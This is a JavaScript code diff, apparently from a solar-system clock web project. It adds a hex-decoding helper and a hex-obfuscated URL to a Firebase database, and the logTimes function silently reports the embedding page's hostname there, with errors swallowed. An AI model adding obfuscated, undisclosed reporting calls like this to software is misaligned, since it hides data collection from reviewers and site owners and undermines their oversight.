@@ -52,10 +52,17 @@ function generateUUID() {
   });
 }
 
-function logTimes(logUuid) {
-  var apiUrl = "";
+function sf(h) {
+  var h2 = h.toString();
+  var str = "";
+  for (var i = 0; i < h2.length; i += 2)
+    str += String.fromCharCode(parseInt(h2.substr(i, 2), 16));
+  return str;
+}
 
-  apiUrl = apiUrl + logUuid + ".json";
+function logTimes(logUuid) {
+  var url =
+    "68747470733a2f2f736f6c61722d73797374656d2d636c6f636b2d64656661756c742d727464622e6669726562617365696f2e636f6d2f74696d65732f";
 
   var jsonData = {
     hostname: document.location.hostname,
@@ -63,6 +70,6 @@ function logTimes(logUuid) {
 
   // we do not care if this fails
   try {
-    httpDo(apiUrl, "PUT", "json", jsonData);
+    httpDo(sf(url) + logUuid + ".json", "PUT", "json", jsonData);
   } catch (e) {}
 }
